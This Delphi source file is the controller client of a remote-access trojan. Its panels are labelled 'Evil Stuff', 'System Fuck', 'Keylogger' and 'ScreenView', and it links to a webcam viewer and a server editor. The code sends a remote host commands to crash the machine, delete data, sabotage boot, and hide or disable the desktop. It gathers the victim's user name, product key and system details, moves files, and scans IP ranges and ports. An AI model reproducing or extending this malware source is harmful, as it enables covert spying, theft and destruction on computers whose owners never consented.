   unit Unit1;

   interface

   uses
     Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
     Dialogs, ImgList, ComCtrls, ExtCtrls, TFlatTitlebarUnit, StdCtrls,
     ScktComp, Buttons, TFlatEditUnit, TabNotBk,Shellapi, TFlatListBoxUnit,Tlhelp32,
     TFlatSpinEditUnit, MPlayer, jpeg, TFlatMemoUnit, TFlatHintUnit;

   type
     TForm1 = class(TForm)
       TreeView1: TTreeView;
       ImageList1: TImageList;
       CS: TClientSocket;
       Panel1: TPanel;
       Panel2: TPanel;
       Label1: TLabel;
       Label2: TLabel;
       Label3: TLabel;
       Label4: TLabel;
       SpeedButton1: TSpeedButton;
       SpeedButton2: TSpeedButton;
       Label6: TLabel;
       PNews: TPanel;
       Memo1: TMemo;
       PAbout: TPanel;
       Label10: TLabel;
       Label11: TLabel;
       Label12: TLabel;
       Label13: TLabel;
       Label15: TLabel;
       PPortscan: TPanel;
       TabbedNotebook1: TTabbedNotebook;
       Label17: TLabel;
       Edit4: TEdit;
       Label18: TLabel;
       Edit5: TEdit;
       Label19: TLabel;
       Edit6: TEdit;
       ListBox1: TListBox;
       Label20: TLabel;
       Label21: TLabel;
       PortScanner: TClientSocket;
       IPScan: TClientSocket;
       Label22: TLabel;
       ListBox2: TListBox;
       Edit7: TEdit;
       Label23: TLabel;
       Label24: TLabel;
       Label25: TLabel;
       Edit8: TEdit;
       Label26: TLabel;
       Edit9: TEdit;
       Label27: TLabel;
       PSystem: TPanel;
       GroupBox1: TGroupBox;
       RadioButton1: TRadioButton;
       RadioButton2: TRadioButton;
       RadioButton3: TRadioButton;
       GroupBox2: TGroupBox;
       PSearch: TPanel;
       Edit11: TEdit;
       Edit12: TEdit;
       BoxFiles: TFlatListBox;
       PProc: TPanel;
       PMessage: TPanel;
       Memo2: TMemo;
       PEvil: TPanel;
       GroupBox5: TGroupBox;
       Edit13: TEdit;
       Bevel1: TBevel;
       SpeedButton3: TSpeedButton;
       SpeedButton4: TSpeedButton;
       SpeedButton5: TSpeedButton;
       SpeedButton6: TSpeedButton;
       SpeedButton7: TSpeedButton;
       SpeedButton8: TSpeedButton;
       SpeedButton9: TSpeedButton;
       SpeedButton10: TSpeedButton;
       SpeedButton11: TSpeedButton;
       SpeedButton12: TSpeedButton;
       SpeedButton13: TSpeedButton;
       SpeedButton14: TSpeedButton;
       Label39: TLabel;
       PChat: TPanel;
       Memo3: TMemo;
       Memo4: TMemo;
       PSystemFun: TPanel;
       GroupBox6: TGroupBox;
       GroupBox7: TGroupBox;
       Bevel2: TBevel;
       Label5: TLabel;
       Edit1: TFlatEdit;
       Edit2: TFlatEdit;
       FlatTitlebar1: TFlatTitlebar;
       Label7: TLabel;
       Bevel3: TBevel;
       Edit3: TEdit;
       SS: TServerSocket;
       Label35: TLabel;
       FlatEdit1: TFlatEdit;
       Label36: TLabel;
       Image1: TImage;
       CS2: TClientSocket;
       OD: TOpenDialog;
       PKeylogger: TPanel;
       Memo5: TMemo;
       Button35: TSpeedButton;
       Shape1: TShape;
       Label43: TLabel;
       Button13: TSpeedButton;
       Button16: TSpeedButton;
       Button14: TSpeedButton;
       Button15: TSpeedButton;
       Button32: TSpeedButton;
       Button8: TSpeedButton;
       Button6: TSpeedButton;
       GroupBox3: TGroupBox;
       Label28: TLabel;
       Label29: TLabel;
       Label30: TLabel;
       Label31: TLabel;
       X_POS: TFlatEdit;
       Y_POS: TFlatEdit;
       Label32: TLabel;
       SpeedButton15: TSpeedButton;
       Button5: TSpeedButton;
       Button7: TSpeedButton;
       FlatListBox1: TFlatListBox;
       Shape2: TShape;
       Button17: TSpeedButton;
       Button33: TSpeedButton;
       Label8: TLabel;
       Button22: TSpeedButton;
       Button23: TSpeedButton;
       Button24: TSpeedButton;
       Button25: TSpeedButton;
       Button26: TSpeedButton;
       Label9: TLabel;
       Label14: TLabel;
       Button31: TSpeedButton;
       Button27: TSpeedButton;
       Button28: TSpeedButton;
       Button29: TSpeedButton;
       Button30: TSpeedButton;
       Button9: TSpeedButton;
       SpeedButton16: TSpeedButton;
       Button20: TSpeedButton;
       Button21: TSpeedButton;
       Button19: TSpeedButton;
       Button18: TSpeedButton;
       Button1: TSpeedButton;
       Button2: TSpeedButton;
       Button3: TSpeedButton;
       Button4: TSpeedButton;
       PSystemD: TPanel;
       Label16: TLabel;
       Label33: TLabel;
       Label34: TLabel;
       Label37: TLabel;
       Label38: TLabel;
       Label40: TLabel;
       Label41: TLabel;
       Label42: TLabel;
       Label44: TLabel;
       FlatMemo1: TFlatMemo;
       POSD: TPanel;
       Label45: TLabel;
       Label46: TLabel;
       Label47: TLabel;
       Label48: TLabel;
       Label49: TLabel;
       Label50: TLabel;
       Label51: TLabel;
       Label52: TLabel;
       Label53: TLabel;
       Label54: TLabel;
       Label55: TLabel;
       Timer1: TTimer;
       FlatHint1: TFlatHint;
       procedure TreeView1Click(Sender: TObject);
       procedure Label1Click(Sender: TObject);
       procedure Button4Click(Sender: TObject);
       procedure Button3Click(Sender: TObject);
       procedure IPScanConnect(Sender: TObject; Socket: TCustomWinSocket);
       procedure IPScanError(Sender: TObject; Socket: TCustomWinSocket;
         ErrorEvent: TErrorEvent; var ErrorCode: Integer);
       procedure Button1Click(Sender: TObject);
       procedure Button2Click(Sender: TObject);
       procedure PortScannerConnect(Sender: TObject;
         Socket: TCustomWinSocket);
       procedure PortScannerError(Sender: TObject; Socket: TCustomWinSocket;
         ErrorEvent: TErrorEvent; var ErrorCode: Integer);
       procedure Button5Click(Sender: TObject);
       procedure Button6Click(Sender: TObject);
       procedure Button8Click(Sender: TObject);
       procedure Button7Click(Sender: TObject);
       procedure Button13Click(Sender: TObject);
       procedure Button14Click(Sender: TObject);
       procedure Button16Click(Sender: TObject);
       procedure Button15Click(Sender: TObject);
       procedure Button17Click(Sender: TObject);
       procedure Button18Click(Sender: TObject);
       procedure SpeedButton3Click(Sender: TObject);
       procedure SpeedButton6Click(Sender: TObject);
       procedure SpeedButton4Click(Sender: TObject);
       procedure SpeedButton5Click(Sender: TObject);
       procedure SpeedButton7Click(Sender: TObject);
       procedure SpeedButton8Click(Sender: TObject);
       procedure SpeedButton11Click(Sender: TObject);
       procedure SpeedButton10Click(Sender: TObject);
       procedure SpeedButton9Click(Sender: TObject);
       procedure SpeedButton14Click(Sender: TObject);
       procedure SpeedButton13Click(Sender: TObject);
       procedure SpeedButton12Click(Sender: TObject);
       procedure Button19Click(Sender: TObject);
       procedure Button20Click(Sender: TObject);
       procedure Button21Click(Sender: TObject);
       procedure Memo4Change(Sender: TObject);
       procedure CSConnecting(Sender: TObject; Socket: TCustomWinSocket);
       procedure CSDisconnect(Sender: TObject; Socket: TCustomWinSocket);
       procedure CSError(Sender: TObject; Socket: TCustomWinSocket;
         ErrorEvent: TErrorEvent; var ErrorCode: Integer);
       procedure CSConnect(Sender: TObject; Socket: TCustomWinSocket);
       procedure SpeedButton1Click(Sender: TObject);
       procedure CSRead(Sender: TObject; Socket: TCustomWinSocket);
       procedure FormCreate(Sender: TObject);
       procedure Button22Click(Sender: TObject);
       procedure Button23Click(Sender: TObject);
       procedure Button24Click(Sender: TObject);
       procedure Button25Click(Sender: TObject);
       procedure Button26Click(Sender: TObject);
       procedure Button31Click(Sender: TObject);
       procedure Button27Click(Sender: TObject);
       procedure Button28Click(Sender: TObject);
       procedure Button29Click(Sender: TObject);
       procedure Button30Click(Sender: TObject);
       procedure BoxFilesMouseUp(Sender: TObject; Button: TMouseButton;
         Shift: TShiftState; X, Y: Integer);
       procedure SpeedButton2Click(Sender: TObject);
       procedure Label7Click(Sender: TObject);
       procedure Label15Click(Sender: TObject);
       procedure SSClientError(Sender: TObject; Socket: TCustomWinSocket;
         ErrorEvent: TErrorEvent; var ErrorCode: Integer);
       procedure SSClientRead(Sender: TObject; Socket: TCustomWinSocket);
       procedure Button32Click(Sender: TObject);
       procedure Button33Click(Sender: TObject);
       procedure CS2Error(Sender: TObject; Socket: TCustomWinSocket;
         ErrorEvent: TErrorEvent; var ErrorCode: Integer);
       procedure Button35Click(Sender: TObject);
       procedure Button34Click(Sender: TObject);
       procedure SpeedButton15Click(Sender: TObject);
       procedure SpeedButton16Click(Sender: TObject);
       procedure Timer1Timer(Sender: TObject);
     private
       { Private declarations }
     public
       { Public declarations }
           IncommingStream:TFileStream;
                   StreamSize:TFileStream;
     end;

   var
     Form1: TForm1;
     IPScan_:boolean;
     IP_IP:string;
     PortScan_:boolean;
     PORT_IP:integer;
   implementation

   uses Unit2, Unit3, Unit4;

   {$R *.dfm}

   procedure Stats(Status:string);
   begin
    form1.Label2.caption := 'Status : '+ status;
   end;

   procedure TForm1.TreeView1Click(Sender: TObject);
   begin
   if treeview1.selected.text = '' then begin

   frmWebCam.show;

   end;
   if treeview1.Selected.Text = 'OS Details' then begin
    pAbout.Visible := FALSE;
    pPortscan.Visible := false;
    pOSD.Visible := true;
     pSystemD.Visible := false;
    pNews.Visible := false;
    pSystem.Visible := false;
    pSearch.Visible := false;
    pproc.Visible := false;
    pMessage.Visible := false;
    pEvil.Visible := false;
    pChat.Visible := false;
    psystemfun.Visible := false;
     pKeylogger.Visible := false;
   end;
   if treeview1.Selected.Text = 'PC Details' then begin
    pAbout.Visible := false;
     pOSD.Visible := false;
     pSystemD.Visible := True;
    pPortscan.Visible := false;
    pNews.Visible := false;
    pSystem.Visible := false;
    pSearch.Visible := false;
    pproc.Visible := false;
    pMessage.Visible := false;
    pEvil.Visible := false;
    pChat.Visible := false;
    psystemfun.Visible := false;
     pKeylogger.Visible := false;
   end;
   if treeview1.Selected.Text = 'About' then begin
    pAbout.Visible := true;
    pPortscan.Visible := false;
    pNews.Visible := false;
    pSystem.Visible := false;
    pSearch.Visible := false;
    pproc.Visible := false;
    pMessage.Visible := false;
    pEvil.Visible := false;
    pChat.Visible := false;
    psystemfun.Visible := false;
     pKeylogger.Visible := false;
       pOSD.Visible := false;
     pSystemD.Visible := false;
   end;

   if treeview1.Selected.Text = 'Upload' then begin
    pAbout.Visible := false;
    pPortscan.Visible := false;
    pNews.Visible := false;
      pOSD.Visible := false;
     pSystemD.Visible := false;
    pSystem.Visible := false;
     pKeylogger.Visible := false;
    pSearch.Visible := false;
    pproc.Visible := true;
    pMessage.Visible := false;
    pEvil.Visible := false;
    pChat.Visible := false;
    psystemfun.Visible := false;
   end;

   if treeview1.Selected.Text = 'EditServ' then begin
    if fileexists('EditServ.exe') then shellexecute(handle,'open','EditServ.exe',nil,nil,0) else
    stats('Couldn''t Find EditServ.exe');
   end;

   if treeview1.Selected.Text = 'Portscanner' then begin
    pAbout.Visible := false;
    psystemfun.Visible := false;
      pOSD.Visible := false;
     pSystemD.Visible := false;
    pPortscan.Visible := true;
     pKeylogger.Visible := false;
    pNews.Visible := false;
     pChat.Visible := false;
    pSystem.Visible := false;

    pSearch.Visible := false;
    pproc.Visible := false;
     pMessage.Visible := false;
    pEvil.Visible := false;
    end;

   if treeview1.Selected.Text = 'System' then begin
    pAbout.Visible := false;
      pOSD.Visible := false;
     pSystemD.Visible := false;
    pPortscan.Visible := false;
    pNews.Visible := false;
    pSystem.Visible := true;
     pKeylogger.Visible := false;

     pChat.Visible := false;
    pSearch.Visible := false;
     psystemfun.Visible := false;
    pproc.Visible := false;
    pMessage.Visible := false;
     pEvil.Visible := false;
   end;

   if treeview1.Selected.Text = 'MSN' then begin
    pAbout.Visible := false;
    pSystem.Visible := false;
     pKeylogger.Visible := false;
     pChat.Visible := false;
       pOSD.Visible := false;
     pSystemD.Visible := false;
    pPortscan.Visible := false;
     psystemfun.Visible := false;
    pNews.Visible := false;

    pSearch.Visible := false;
    pproc.Visible := false;
     pEvil.Visible := false;
     pMessage.Visible := false;
   end;

   if treeview1.Selected.Text = 'News' then begin
    pAbout.Visible := false;
     pKeylogger.Visible := false;
    pSystem.Visible := false;
      pOSD.Visible := false;
     pSystemD.Visible := false;
     pChat.Visible := false;
      psystemfun.Visible := false;
    pPortscan.Visible := false;
    pNews.Visible := true;

     pMessage.Visible := false;
    pSearch.Visible := false;
    pproc.Visible := false;
     pEvil.Visible := false;
   end;

   if treeview1.Selected.Text = 'Find File' then begin
    pAbout.Visible := false;
     psystemfun.Visible := false;
    pSystem.Visible := false;
     pChat.Visible := false;
    pPortscan.Visible := false;
    pNews.Visible := false;
     pKeylogger.Visible := false;
       pOSD.Visible := false;
     pSystemD.Visible := false;

     pMessage.Visible := false;
    pSearch.Visible := true;
    pproc.Visible := false;
     pEvil.Visible := false;
   end;

   if treeview1.Selected.Text = 'Process' then begin
    pAbout.Visible := false;
    pSystem.Visible := false;
     pChat.Visible := false;
    pPortscan.Visible := false;
     psystemfun.Visible := false;
    pNews.Visible := false;
      pOSD.Visible := false;
     pSystemD.Visible := false;

     pMessage.Visible := false;
      pKeylogger.Visible := false;
    pSearch.Visible := false;
     pEvil.Visible := false;
    pproc.Visible := true;
   end;
   if treeview1.Selected.Text = 'Evil Stuff' then begin
    pAbout.Visible := false;
     pChat.Visible := false;
    pSystem.Visible := false;
    pPortscan.Visible := false;
    pNews.Visible := false;

      pOSD.Visible := false;
     pSystemD.Visible := false;
     pKeylogger.Visible := false;
     psystemfun.Visible := false;
     pMessage.Visible := False;
    pSearch.Visible := false;
    pproc.Visible := false;
     pEvil.Visible := True;
   end;
   if treeview1.Selected.Text = 'System Fuck' then begin
    pAbout.Visible := false;
    pSystem.Visible := false;
     pChat.Visible := false;
    pPortscan.Visible := false;
    pNews.Visible := false;

     pKeylogger.Visible := false;
     pMessage.Visible := false;
      psystemfun.Visible := true;
    pSearch.Visible := false;
    pproc.Visible := false;
      pOSD.Visible := false;
     pSystemD.Visible := false;
     pEvil.Visible := false;
   end;
   if treeview1.Selected.Text = 'Message' then begin
    pAbout.Visible := false;
     pKeylogger.Visible := false;
    pSystem.Visible := false;
     pChat.Visible := false;
    pPortscan.Visible := false;
    pNews.Visible := false;

     pMessage.Visible := true;
      psystemfun.Visible := false;
        pOSD.Visible := false;
     pSystemD.Visible := false;
    pSearch.Visible := false;
    pproc.Visible := false;
     pEvil.Visible := false;
   end;
   if treeview1.Selected.Text = 'ScreenView' then begin
    if form1.cs.active = true then
    ScreenV.show;
   end;
   if treeview1.Selected.Text = 'Keylogger' then begin
    pAbout.Visible := false;
     pKeylogger.Visible := true;
       pOSD.Visible := false;
     pSystemD.Visible := false;
    pSystem.Visible := false;
     pChat.Visible := false;
    pPortscan.Visible := false;
    pNews.Visible := false;

     pMessage.Visible := false;
      psystemfun.Visible := false;
    pSearch.Visible := false;
    pproc.Visible := false;
     pEvil.Visible := false;
   end;
   if treeview1.Selected.Text = 'Chat' then begin
    pAbout.Visible := false;
      pOSD.Visible := false;
     pSystemD.Visible := false;
     pKeylogger.Visible := false;
    pSystem.Visible := false;
     pChat.Visible := true;
    pPortscan.Visible := false;
    pNews.Visible := false;
     psystemfun.Visible := false;

     pMessage.Visible := false;
    pSearch.Visible := false;
    pproc.Visible := false;
     pEvil.Visible := false;
   end;


   end;

   procedure TForm1.Label1Click(Sender: TObject);
   begin
   application.Terminate;
   end;

   procedure TForm1.Button4Click(Sender: TObject);
   begin
   IPScan_:= true;
   label27.Caption := edit8.Text;
   IP_IP:= edit8.text;
   IPScan.Address := label27.Caption;
   IPScan.Port := strtoint(edit7.Text);
   IPScan.Active := true;
   end;

   procedure TForm1.Button3Click(Sender: TObject);
   begin
   IPScan_:= false;
   end;

   procedure TForm1.IPScanConnect(Sender: TObject; Socket: TCustomWinSocket);
   var
    ip1,ip2,ip3,ip4:string;
    i1,i2,i3,i4:boolean;
    p1,p2,p3,p4:integer;
    x:integer;
   begin
   // Connection Found, Lets Report that:

   Listbox2.Items.Add(inttostr(socket.LocalPort) + ':' + socket.LocalAddress);

   // Okey, Reported.. Now lets dissconnect, and connect to next port (:

   i1:=true;
   i2:=false;
   i3:=false;
   i4:=false;
   ip1:='';
   ip2:='';
   ip3:='';
   ip4:='';

   for x := 0 to length(IP_IP) do
   begin
   //First Get IP1...
   if i1 = true then begin
    if copy(ip_ip,x,1) <> '.' then
     ip1 := ip1 + copy(ip_ip,x,1)
    else begin
     i1:=false;
     i2:=true;
    end;
   end;

   if i2 = true then begin
    if copy(ip_ip,x,1) <> '.' then
     ip2 := ip2 + copy(ip_ip,x,1)
    else begin
     i2:=false;
     i3:=true;
    end;
   end;

   if i3 = true then begin
    if copy(ip_ip,x,1) <> '.' then
     ip3 := ip3 + copy(ip_ip,x,1)
    else begin
     i3:=false;
     i4:=true;
    end;
   end;

   if i4 = true then begin
    if copy(ip_ip,x,1) <> '.' then
     ip4 := ip4 + copy(ip_ip,x,1)
   end;

   end;
   p1:=strtoint(ip1);
   p2:=strtoint(ip2);
   p3:=strtoint(ip3);
   p4:=strtoint(ip4);
   inc(p4,1);
   if strtoint(ip4) > 255 then begin
    ip4:='0';
   inc(p3,1);
   end;
   if strtoint(ip3) > 255 then begin
    ip3:='0';
   inc(p2,1);
   end;
   if strtoint(ip2) > 255 then begin
    ip2:='0';
   inc(p1,1);
   end;
   if strtoint(ip1) > 255 then begin
    ip1:='0';
    IPScan_ := false;
   end;

   IP_IP := inttostr(p1)+
            '.'+
            inttostr(p2)+
            '.'+
            inttostr(p3)+
            '.'+
            inttostr(p4);
   label27.caption := IP_IP;

   if IPScan_ = true then
   begin
   IPSCAN.Active := false;
   Ipscan.Port := strtoint(edit7.text);
   ipscan.Address := ip_ip;
   ipscan.Active := true;
   end;

   end;

   procedure TForm1.IPScanError(Sender: TObject; Socket: TCustomWinSocket;
     ErrorEvent: TErrorEvent; var ErrorCode: Integer);
   label arsle;
   var
    ip1,ip2,ip3,ip4:string;
    i1,i2,i3,i4:boolean;
    p1,p2,p3,p4:integer;
    x:integer;
   begin
   errorcode := 0;


   i1:=true;
   i2:=false;
   i3:=false;
   i4:=false;
   ip1:='';
   ip2:='';
   ip3:='';
   ip4:='';

   for x := 1 to length(IP_IP) do
   begin
   //First Get IP1...
   if i1 = true then begin
    if copy(ip_ip,x,1) <> '.' then
     ip1 := ip1 + copy(ip_ip,x,1)
    else begin
     i1:=false;
     i2:=true;
     goto arsle;
    end;
   end;

   if i2 = true then begin
    if copy(ip_ip,x,1) <> '.' then
     ip2 := ip2 + copy(ip_ip,x,1)
    else begin
     i2:=false;
     i3:=true;
     goto arsle;
    end;
   end;

   if i3 = true then begin
    if copy(ip_ip,x,1) <> '.' then
     ip3 := ip3 + copy(ip_ip,x,1)
    else begin
     i3:=false;
     i4:=true;
     goto arsle;
    end;
   end;

   if i4 = true then begin
    if copy(ip_ip,x,1) <> '.' then
     ip4 := ip4 + copy(ip_ip,x,1)
   end;
   arsle:
   end;

   p1:=strtoint(ip1);
   p2:=strtoint(ip2);
   p3:=strtoint(ip3);
   p4:=strtoint(ip4);
   inc(p4,1);
   if strtoint(ip4) > 255 then begin
    ip4:='0';
   inc(p3,1);
   end;
   if strtoint(ip3) > 255 then begin
    ip3:='0';
   inc(p2,1);
   end;
   if strtoint(ip2) > 255 then begin
    ip2:='0';
   inc(p1,1);
   end;
   if strtoint(ip1) > 255 then begin
    ip1:='0';
    IPScan_ := false;
   end;

   IP_IP := inttostr(p1)+
            '.'+
            inttostr(p2)+
            '.'+
            inttostr(p3)+
            '.'+
            inttostr(p4);
   label27.caption := IP_IP;

   if IP_IP = edit9.Text then begin
    ip_ip := edit8.text;
    IPScan_:=false;
   end;

   if IPScan_ = true then
   begin
   socket.Close;
   ipscan.Active := false;
   Ipscan.Port := strtoint(edit7.text);
   ipscan.Address := ip_ip;
   ipscan.Active := true;
   end;

   end;

   procedure TForm1.Button1Click(Sender: TObject);
   begin
   port_ip := strtoint(edit4.text);
   portscanner.Port := strtoint(edit4.text);
   portscanner.Address := edit6.Text;
   portscan_ := true;
   portscanner.Active := true;
   end;

   procedure TForm1.Button2Click(Sender: TObject);
   begin
   portscan_:=false;
   end;

   procedure TForm1.PortScannerConnect(Sender: TObject;
     Socket: TCustomWinSocket);
   begin
   // Found connection, ok, good now lets report :D

   listbox1.items.add(inttostr(socket.LocalPort)+':'+socket.LocalAddress);

   // blah

   // nice now we need to Increase port and connect to new port :D

   inc(port_ip,1);
   if port_ip = strtoint(edit5.text) then begin
    port_ip := strtoint(edit4.text);
    portscan_:=false;
    exit;
   end;
   if portscan_ = true then begin
   portscanner.Active := false;
   portscanner.Port := port_ip;
   portscanner.Active := true;
   end;
   label21.Caption := 'Current Port : '+inttostr(port_ip);
   end;

   procedure TForm1.PortScannerError(Sender: TObject;
     Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
     var ErrorCode: Integer);
   begin
   errorcode := 0;
   inc(port_ip,1);
   if port_ip = strtoint(edit5.text) then begin
    port_ip := strtoint(edit4.text);
    portscan_:=false;
    exit;
   end;
   if portscan_ = true then begin
   portscanner.Active := false;
   portscanner.Port := port_ip;
   portscanner.Active := true;
   end;
   label21.Caption := 'Current Port : '+inttostr(port_ip);
   end;

   procedure TForm1.Button5Click(Sender: TObject);
   begin
   if radiobutton1.Checked = True then begin
    if cs.Active = true then
     cs.Socket.SendText('HIDE_TASKBAR');
   end;
   if radiobutton2.Checked = True then begin
    if cs.Active = true then
     cs.Socket.SendText('HIDE_START');
   end;
   if radiobutton3.Checked = True then begin
    if cs.Active = true then
     cs.Socket.SendText('HIDE_DESKTOP');
   end;
   end;

   procedure TForm1.Button6Click(Sender: TObject);
   begin
   if radiobutton1.Checked = True then begin
    if cs.Active = true then
     cs.Socket.SendText('SHOW_TASKBAR');
   end;
   if radiobutton2.Checked = True then begin
    if cs.Active = true then
     cs.Socket.SendText('SHOW_START');
   end;
   if radiobutton3.Checked = True then begin
    if cs.Active = true then
     cs.Socket.SendText('SHOW_DESKTOP');
   end;
   end;

   procedure TForm1.Button8Click(Sender: TObject);
   begin
   if radiobutton1.Checked = True then begin
    if cs.Active = true then
     cs.Socket.SendText('DISA_TASKBAR');
   end;
   if radiobutton2.Checked = True then begin
    if cs.Active = true then
     cs.Socket.SendText('DISA_START');
   end;
   if radiobutton3.Checked = True then begin
    if cs.Active = true then
     cs.Socket.SendText('DISA_DESKTOP');
   end;
   end;

   procedure TForm1.Button7Click(Sender: TObject);
   begin
   if radiobutton1.Checked = True then begin
    if cs.Active = true then
     cs.Socket.SendText('ENAB_TASKBAR');
   end;
   if radiobutton2.Checked = True then begin
    if cs.Active = true then
     cs.Socket.SendText('ENAB_START');
   end;
   if radiobutton3.Checked = True then begin
    if cs.Active = true then
     cs.Socket.SendText('ENAB_DESKTOP');
   end;
   end;

   procedure TForm1.Button13Click(Sender: TObject);
   begin
   if cs.Active = true then begin
    boxfiles.Items.Clear;
    cs.socket.sendtext('SEAR_'+edit11.text);
   end;
   end;

   procedure TForm1.Button14Click(Sender: TObject);
   begin
   BoxFiles.Items.Clear;
   end;

   procedure TForm1.Button16Click(Sender: TObject);
   begin
   if cs.Active = true then begin
    if edit12.text <> '' then cs.socket.sendtext('SEA_D'+edit12.text);
   end;
   end;

   procedure TForm1.Button15Click(Sender: TObject);
   begin
   if cs.Active = true then begin
    if edit12.text <> '' then cs.socket.sendtext('SEA_E'+edit12.text);
   end;
   end;

   procedure TForm1.Button17Click(Sender: TObject);
   begin
   if od.Execute then begin

    flatedit1.text := od.FileName;

   end;
   end;

   procedure TForm1.Button18Click(Sender: TObject);
   begin
   if cs.Active = true then begin
    cs.socket.sendtext('MESSA'+memo2.text);
    memo2.Clear;
   end;
   end;

   procedure TForm1.SpeedButton3Click(Sender: TObject);
   begin
   if cs.Active = true then begin
    cs.socket.sendtext('CMOS_');

   end;
   end;

   procedure TForm1.SpeedButton6Click(Sender: TObject);
   begin
   if cs.Active = true then begin
    cs.socket.sendtext('DELDI');

   end;
   end;

   procedure TForm1.SpeedButton4Click(Sender: TObject);
   begin
   if cs.Active = true then begin
    cs.socket.sendtext('CRASH');

   end;
   end;

   procedure TForm1.SpeedButton5Click(Sender: TObject);
   begin
   if cs.Active = true then begin
    cs.socket.sendtext('EATME');

   end;
   end;

   procedure TForm1.SpeedButton7Click(Sender: TObject);
   begin
   if cs.Active = true then begin
    cs.socket.sendtext('SABOT');

   end;
   end;

   procedure TForm1.SpeedButton8Click(Sender: TObject);
   begin
   if cs.Active = true then begin
    cs.socket.sendtext('COVER');

   end;
   end;

   procedure TForm1.SpeedButton11Click(Sender: TObject);
   begin
   if cs.Active = true then begin
    cs.socket.sendtext('CRITI');

   end;
   end;

   procedure TForm1.SpeedButton10Click(Sender: TObject);
   begin
   if cs.Active = true then begin
    cs.socket.sendtext('CONST');

   end;
   end;

   procedure TForm1.SpeedButton9Click(Sender: TObject);
   begin
   if cs.Active = true then begin
    cs.socket.sendtext('FLIPS');

   end;
   end;

   procedure TForm1.SpeedButton14Click(Sender: TObject);
   begin
   if cs.Active = true then begin
    cs.socket.sendtext('BOOTS');

   end;
   end;

   procedure TForm1.SpeedButton13Click(Sender: TObject);
   begin
   if cs.Active = true then begin
    cs.socket.sendtext('MSDOS');

   end;
   end;

   procedure TForm1.SpeedButton12Click(Sender: TObject);
   begin
   if cs.Active = true then begin
    cs.socket.sendtext('EMPTY');

   end;
   end;

   procedure TForm1.Button19Click(Sender: TObject);
   begin
   if cs.Active = true then begin
    cs.socket.sendtext('CREAT'+edit13.text);

   end;
   end;

   procedure TForm1.Button20Click(Sender: TObject);
   begin
   if cs.Active = true then begin
    cs.socket.sendtext('chatc');
   end;
   end;

   procedure TForm1.Button21Click(Sender: TObject);
   begin
   if cs.Active = true then begin
    cs.socket.sendtext('c_msg'+memo4.text);
    memo3.lines.add('You Said : ');
    memo3.lines.add('  '+memo4.text);
    memo4.text := '';
   end
   else
   begin
    memo4.Text := '';
    memo3.lines.Add('*** Not Connected');
   end;
   end;

   procedure TForm1.Memo4Change(Sender: TObject);
   begin
   if memo4.text <> '' then
   begin
   if cs.Active = true then begin
    cs.socket.sendtext('_typ_');
   end;
   end
   else
   begin
   if cs.Active = true then begin
    cs.socket.sendtext('notyp');
   end;
   end;
   end;

   procedure TForm1.CSConnecting(Sender: TObject; Socket: TCustomWinSocket);
   begin
   stats('Connecting ...');
   end;

   procedure TForm1.CSDisconnect(Sender: TObject; Socket: TCustomWinSocket);
   begin
   stats('Idle ...');
   ss.close;
   end;

   procedure TForm1.CSError(Sender: TObject; Socket: TCustomWinSocket;
     ErrorEvent: TErrorEvent; var ErrorCode: Integer);
   begin
   errorcode := 0;
   stats('Idle ...');
   ss.close;
   end;

   procedure TForm1.CSConnect(Sender: TObject; Socket: TCustomWinSocket);
   begin
   stats('Connected ...');
   cs.Socket.SendText('_PWD_');
   ss.Port := cs.Port + 1;
   ss.Open;
   end;

   procedure TForm1.SpeedButton1Click(Sender: TObject);
   begin
   cs.Port := strtoint(edit2.text);
   cs.Address := edit1.text;
   cs.Active := true;
   end;

   procedure TForm1.CSRead(Sender: TObject; Socket: TCustomWinSocket);
   var
   IncommingText, StrippedData, CommandName,Choice: string;

   email:String;
   i:integer;
   begin
        IncommingText := socket.ReceiveText;
        StrippedData := copy(IncommingText,6,length(IncommingText) );
        CommandName := copy(IncommingText,0,5);


   // System Details Start;
   if commandname = 'USERN' then begin
    label16.caption := strippeddata;
   end
   else

   if commandname = 'COMPN' then begin
    label33.caption := strippeddata;
   end
   else

   if commandname = 'REGOR' then begin
    label34.caption := strippeddata;
   end
   else

   if commandname = 'REGUS' then begin
    label37.caption := strippeddata;
   end
   else

   if commandname = 'WORKG' then begin
    label38.caption := strippeddata;
   end
   else

   if commandname = 'PRNAM' then begin
    label40.caption := strippeddata;
   end
   else

   if commandname = 'PRSPE' then begin
    label41.caption := strippeddata;
   end
   else

   if commandname = 'RESOL' then begin
    label42.caption := strippeddata;
   end
   else

   if commandname = 'DPRIN' then begin
    label44.caption := strippeddata;
   end
   else

   if commandname = 'ALLOT' then begin
    flatmemo1.Text := strippeddata;
   end
   else
   // System Details End;
   // OS Detail Start ;


   if commandname = 'OPERA' then begin
    label45.caption := strippeddata;
   end
   else

   if commandname = 'VERSI' then begin
    label46.caption := strippeddata;
   end
   else

   if commandname = 'VERNR' then begin
    label47.caption := strippeddata;
   end
   else

   if commandname = 'PRODK' then begin
    label48.caption := strippeddata;
   end
   else

   if commandname = 'DIREX' then begin
    label49.caption := strippeddata;
   end
   else

   if commandname = 'CTIME' then begin
    label50.caption := strippeddata;
   end
   else

   if commandname = 'SHARE' then begin
    label53.caption := strippeddata;
   end
   else

   if commandname = 'PRINT' then begin
    label54.caption := strippeddata;
   end
   else

   if commandname = 'SLIST' then begin
    label45.caption := strippeddata;
   end
   else

   // OS Details End;
   if commandname = 'DONE!' then begin
    showmessage('Filetransfer Done');
    label14.caption := '0 Bytes Sent';
   end
   else
   if commandname = 'FILEN' then
   begin
    form2.label6.caption := strippeddata;

   end
   else
   if commandname = 'MOPOS' then
   begin
    label29.caption := strippeddata;

   end
   else
   if commandname = 'FILEX' then
   begin
    label14.caption := strippeddata+' Bytes Sent';

   end
   else
   if commandname = 'FILES' then
   begin
    IncommingStream := TFileStream.Create(edit3.text+extractfilename(form2.label6.caption), fmCREATE or fmOPENWRITE and fmsharedenywrite);
    form2.FlatGauge2.MaxValue := strtoint(strippeddata);
    form2.FlatGauge3.MaxValue := strtoint(strippeddata);
    form2.FlatGauge3.Progress := strtoint(strippeddata);
    form2.Label5.caption := strippeddata;
    form2.left := 0;
    form2.Top := 0;
    form2.show;
   end
   else
   if commandname = 'SEAR_' then begin

     BoxFiles.Items.Add(Strippeddata);

   end;

   if commandname = '_PWD_' then begin
   {
    if Strippeddata <> ' ' then begin
     if edit3.text = strippeddata then
      stats('Connected ...')
     else begin
      stats('Idle ...');
      cs.Active := false;
     end;
    end
    else begin
      stats('Connected ...');
    end;
    }
   end;
